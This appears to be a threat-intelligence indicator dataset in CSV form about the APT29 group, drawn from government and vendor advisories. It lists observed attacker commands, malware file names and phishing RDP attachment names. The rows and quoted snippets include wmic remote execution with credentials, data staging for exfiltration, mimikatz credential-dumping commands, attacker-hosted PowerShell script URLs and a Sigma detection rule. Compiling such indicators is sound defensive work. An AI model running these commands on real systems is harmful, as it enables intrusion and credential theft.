1.0.0,actor--apt29,artifact--sha256:fb89286e2b02e6a7193361fcfabd74e1e1b81aced584998d8d23a2966b5c2907,observation--sha256:8b73ef3c102364cfba0590b8ffe2c60ccccfd45a904684dc44aca204cfa74bd8,command," powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof"," powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:b81713ed8cb42d9248147c1c9fce1b5c52602561b634e67c70eff33e729089bb,observation--sha256:55834d48448a01e641b4edb51fc17c21405972265b91db8efd8419fe8c5a4b41,command," powershell Compress-Archive -Path ""C:\Program Files\Microsoft SQL"," powershell Compress-Archive -Path ""C:\Program Files\Microsoft SQL",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:9cb5f06c8cae14744d01749eb716017ad5263bc47417b8de6fe188f53f1ce4c1,observation--sha256:7f014ab518de0bc25dfe7b5acf3b2e4ce28c1a42d00157a0fba52f86a069aab3,command, powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath, powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:b93122a30e19ccb550ce46fa49505489d1a9d97e1f4fa463bdc90de00d6a6786,observation--sha256:e1271563f4cce8270cca0e10ddf625e70c2c40983c63d8eb7951e7a1376b0a64,command, powershell Get-WindowsDriver -Online -All, powershell Get-WindowsDriver -Online -All,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:8d50bd67c34c0b793d5721775bc6a33f66a4f449b8adabf83e6796157aff197f,observation--sha256:c28b2acad8d1362a82e0ed895f11970475724a26cd7eedb3877af1bd90223f26,command, powershell Get-WmiObject -Class Win32_Service -Computername, powershell Get-WmiObject -Class Win32_Service -Computername,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:9e61a2412f8981dfd895089554f1a35ea618a66849cb545b58c7027f78bcc0f2,observation--sha256:1b36527615ea9bc6a87fcae96b5696164ab594aa3bfc926855503a55c09cf310,command," wmic /node:""""<redacted>"""" /user:""""<redacted>"" /password:""""<redacted>"""" process call create"," wmic /node:""""<redacted>"""" /user:""""<redacted>"" /password:""""<redacted>"""" process call create",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:7932d11b7bfc108c03eff89fbe2ff1bb8a223600aed0c10b200648c9dcb0a266,observation--sha256:bc09b90578ffe2da2cb5b27d02eacdbd4748a12b302af48a31827c98c88e9adc,command," wmic /node:""""<redacted>"""" /user:""""<redacted>"""" /password:""""<redacted>"""" process list brief"," wmic /node:""""<redacted>"""" /user:""""<redacted>"""" /password:""""<redacted>"""" process list brief",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 3 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR ha",
1.0.0,actor--apt29,artifact--sha256:10e2fc5541bd062b93b94553c35283a043e6440676a88b0681712c7e27385867,observation--sha256:461f60fa77a2e1cac69595ca3406a475060b7548a368e193867cfb1e479fe217,command," wmic /node:""""<redacted>"""" process list brief"," wmic /node:""""<redacted>"""" process list brief",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 3 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR ha",
1.0.0,actor--apt29,artifact--sha256:35d6d270e670dea823366b759ed72414f9bda51c1fe2ce8e433b4fc3ff1e87bf,observation--sha256:f6a02c9e9f573c0b9d43c52c9c877c1b8fccf5b56039ec68c95da039f709f626,command, wmic process <proc_id> get commandline, wmic process <proc_id> get commandline,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 3 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR ha",
1.0.0,actor--apt29,artifact--sha256:de2235d94d23fe8d0c0ab3bef82551a8211dd5ced446ce98ab4c1d0110891346,observation--sha256:f707d0784b1d595952ed020744d1f5dd6cdec571f8a9a72f078c098fbcf1e5fb,command," wmic process call create ""C:\Program Files\Windows Defender Advanced Threat"," wmic process call create ""C:\Program Files\Windows Defender Advanced Threat",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:075caccd00792c2537792c4084935d0d960d59b9865f5fc485504921a571f0ae,observation--sha256:ae93bb2eecbbb490c27809e9e7c67b3b9398e68af384b4d2c9296dbdbac01b68,command, wmic process get commandline -all, wmic process get commandline -all,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 3 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR ha",
1.0.0,actor--apt29,artifact--sha256:0035a1d9dd410fa0af79a6c41f2f64e83399d03fa03310028b00ab6b2f85bd60,observation--sha256:19b724f2baf26083dfc997403f18060eef9d235fde5e299351030628d1c90231,command," wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed"," wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:df0e0e11b1a372b7dfa9d1d2db4e6c4ab0727cd098ed863f54fe9c9cce05a3c5,observation--sha256:182ab6c6d923f9de2dae2fdbf9d1a216bb6a2a0a12bc8cfb58ab03c6e7820431,file-name,46tt83y6.ps1,46tt83y6.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 45}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 6.9 Javascript Injection Points jenkins.findfwd.com/sk-jspark_init.php test.directfwd.com/sk-jspark_init.php securesearchnow.com/sk-jspark_init.php alertmeter.info/sk-jspark_init.php freeresultsguide.com/sk-jspark_init.php 6.10 External Post-Exploitation Scripts 141.136.0.4/46tt83y6.ps1 173.232.146.12/Invoke-SocksProxy.psm1 176.10.118.136/pwrvw.ps1 179.43.141.188:80/46tt83y6.ps1 179.43.141.188:81/46tt83y6.ps1 179.43.141.188:82/46tt83y6.ps1 179.43.141.188:83/46tt83y,
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:498b131788e249a74bcd02c2addbf786f4259a02b5aa3aae5f8019e7b6078e38,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Once the shellcode is decrypted, it is indirectly spawned in a new thread byabusing FLS callbacks toobtain execution control as shown inFigure 14. Ratherthan specifying the shellcode’s address as thestart address for the thread, NTDLL’s rtlFlsAlloc is used instead. The rtlFlsAlloc function is used toallocatefiber local storageand takes a callbackfunction as an argument. GraphicalNeutrino creates thethread in a suspended state and updates the thread’s context to have the RCX",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:01e8c5b8771d0ef05b30b00966225352694561f7430ef410bc96d2a9bd9285c3,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Malware The malicious ZIP file “schedule.zip”  SHA256cf160175c661efd4b1e1eecadf5f00f7203ef4c7445e36e3373d50b26086c552  was auto-downloadedfrom totalmassasje[.]no and contains three files, as shown inTable 1. Filename File Type SHA256 november_schedulexe.pdf EXE 844e902977b478eace8568f49dd9e5c91db8e534f3c5410ee663d0be02bdf7e3 vcruntime140.dll DLL a0c3e6cd167b93f4646a7a3f2d46ed8bd4888d861b533662a66ca9711d49db1f 7za.dll DLL 381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:b8dfec6e57c40352c84ccd963bdaca71dfbd02f85c8de333bc72d4ccb7fd0373,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS be version 14.30.30704.0; however, a comparison with the legitimate version of the DLL  SHA256 081a273ad809f650ebaeb91c11fcc7a1ad91232a7228f8e98b52191fe44cb06d) reveals that the file hasbeen modified. A side-by-side comparison of each DLL’s Properties window is shown inFigure 6withthe legitimate version on the left and the modified version on the right. Notably, the modified versionhas also removed Microsoft’s digital signature. Figure 6 Comparison of the legitimate (left) ",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:ed0a84d0273f35cb7992a919e0655b55cad9f4421349181f988d561fc6d865e4,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS victim’s machine. The DLL is written in C   and contains only 1 export function  DeviceAll), whichsimply returns when called. The actual malicious code is implemented in a thread that is spawned inDLLMain during the DLL’s initialization. Multiple anti-analysis and evasion techniques are usedthroughout the malware including API unhooking, dynamically resolving APIs, string encryption, andsandbox evasion. When GraphicalNeutrino starts a thread, it attempts to remove any API h",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:8ba6b46f0719d28240a13d44100e765f40013468c3cf5266aa30ac99afa1a9d1,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 4/11 IoC reference sheet SNOWYAMBER Indicator Value Sample dated 24/10/2022 File Name 7za.dll File Size 270,336B MD5 d0efe94196b4923eb644ec0b53d226cc SHA1 c938934c0f5304541087313382aee163e0c5239c SHA256 381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62c6b0692103c Indicator Value Sample dated 8/02/2023 File Name BugSplatRc64.dll File Size 271,360B MD5 cf36bf564fbb7d5ec4cec9b0f185f6c9 SHA1 8eb64670c10505322d45f6114bc9f7de0826e3a1 SHA256",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:b6b977af52b05c7706cbb6bb256c57e5f82a5e888ab935394c95408741249cb6,file-name,7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 20/24 Appendix A – IOCs File IoCs Indicator Value Sample dated 24/10/2022 File Name 7za.dll File Size 270,336B MD5 d0efe94196b4923eb644ec0b53d226cc SHA1 c938934c0f5304541087313382aee163e0c5239c SHA256 381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62c6b0692103c Indicator Value Sample dated 8/02/2023 File Name BugSplatRc64.dll File Size 271,360B MD5 cf36bf564fbb7d5ec4cec9b0f185f6c9 SHA1 8eb64670c10505322d45f6114bc9f7de0826e3a1 SHA256 e",
1.0.0,actor--apt29,artifact--sha256:47b2082dc3cbc5fa163dd883b1af48bca67595f39f7d2adb76bcc2f04b8f9c40,observation--sha256:4ff453165f8c552d5338959d4725029573540556550d3adb82ba0372c71b2179,file-name,(7za.dll,7za.dll,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/24 Container File – ZIP In October 2022, the adversary used a ZIP archive to deliver SNOWYAMBER. Schedule.zip contained the following files: . ├── 7za.dll ├── november_schedul exe.pdf └── vcruntime140.dll Filename november_schedulexe.pdf uses the right-to-left override technique to attempt to mimic the pdf extension while in fact, it is .exe. The file is a renamed, legitimate 7-zip executable. Vcruntime140.dll is a benign, although modi",
1.0.0,actor--apt29,artifact--sha256:9725dc59d7181533df7e28632f151c30239d7f12126fb39f867755d6699f86e4,observation--sha256:736d1ad707a10eccf5a439d2e64598fee80ba491169c28d5cf4641159747afc3,file-name,7za.exe,7za.exe,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS victim’s machine. The DLL is written in C   and contains only 1 export function  DeviceAll), whichsimply returns when called. The actual malicious code is implemented in a thread that is spawned inDLLMain during the DLL’s initialization. Multiple anti-analysis and evasion techniques are usedthroughout the malware including API unhooking, dynamically resolving APIs, string encryption, andsandbox evasion. When GraphicalNeutrino starts a thread, it attempts to remove any API h",
1.0.0,actor--apt29,artifact--sha256:0af706739efc5d4a6839e59e816350754957ebab476d19f5694ee26e6527e274,observation--sha256:86b5594a2cc8bb1bf9a6c97a73981ddf0cbb3b4d5c3b1fa37a3785f80781995a,file-name,ADVAPI32.DLL,ADVAPI32.DLL,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,S2GRUPO | LAB5243 Table 6. Libraries and functions resolved by the first code block LIBRARY API KERNEL32.DLL GetProcessHeap HeapAlloc HeapFree VirtualAlloc VirtualProtect VirtualFree ExitProcess GetSystemFirmwareTable GetVersionExA ADVAPI32.DLL RegOpenKeyExA RegQueryValueExA RegCloseKey MD5Init MD5Update MD5Final USER32.DLL wsprintfA MessageBoxA OLE32.DLL CoInitialize CoInitializeSecurity CoInitializeInstance CoCreateInstance CoSetProxyBlanket CoUninitialize OLEAUT32.DLL VariantClear VariantInit,
1.0.0,actor--apt29,artifact--sha256:7bcb1cd48eaebcc2f2bec0e2a8d472fb75b4d214fa3b0bf51e5956a3366116a9,observation--sha256:f4f65c061e72eb64475f828e56e3ad3e29d5b08d88014190343e1e5293ce5614,file-name,AWS IAM Compliance Check.rdp,AWS IAM Compliance Check.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 283}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS IAM Compliance Check.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:5c56729b257dbb33a5524313cc80a079cba627c1efbce912eca71665da68a8b0,observation--sha256:1245e3d16c1d0b7546d8f26ab4cb619e161ba6c95e6b735b17faada95e728fc3,file-name,AWS IAM Configuration.rdp,AWS IAM Configuration.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 284}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS IAM Configuration.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:7bd8134ddf6b8231856d56e5642dd021d75f32706051f5eca3f16ebdf8d778ee,observation--sha256:7f716e076612e6077fcb636c5d5838a99f3d90d46b18a6b6527b31e20544596f,file-name,AWS IAM Quick Start.rdp,AWS IAM Quick Start.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 285}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS IAM Quick Start.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:d45b9c46fde26b43ab4ff8940157fc7548db3d20286e5f9753d7c607169a2c11,observation--sha256:55249e3a949a52bc60216de1b001a0d39d2cd1026f20956b2c52b0050ff58d0b,file-name,AWS SDE Compliance Check.rdp,AWS SDE Compliance Check.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 286}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS SDE Compliance Check.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:08e36aa56acdc5fe137be8a9f4580ec9929c74e9dad16322f2d6bf59d3de5206,observation--sha256:924830dbb2392907ff5a6cae5c345ac01f12f43beb71ddb9a640290be153c9af,file-name,AWS SDE Environment Check.rdp,AWS SDE Environment Check.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 287}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS SDE Environment Check.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:c9a74c83581f74df638550d72b421f4815beeedcd14cf4af98b773daaed7bd82,observation--sha256:218f6f32932512c42dce322f32fd529105b5fc4d7bd09f338f46addb2b0224d7,file-name,AWS Secure Data Exchange Compliance.rdp,AWS Secure Data Exchange Compliance.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 288}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS Secure Data Exchange Compliance.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:f52e17a027da73a9eb350dab63071b0f9152cf7bbf425ef9de464f033f56132b,observation--sha256:b6da1a7a7456019f866808c23251ccddd4e422b80484bf0e3604712a019aea6a,file-name,AWS Secure Data Exchange – Compliance Check.rdp,AWS Secure Data Exchange – Compliance Check.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 289}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS Secure Data Exchange – Compliance Check.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:8a20780b884f7d23515a7785b21e22dff3977f75df565e970d0a6764f923a5ec,observation--sha256:83cc2d4b59742248a44568a60419e90f961a3689503beed2dda3a50c6de59060,file-name,AclNumsInvertHost.dll,AclNumsInvertHost.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
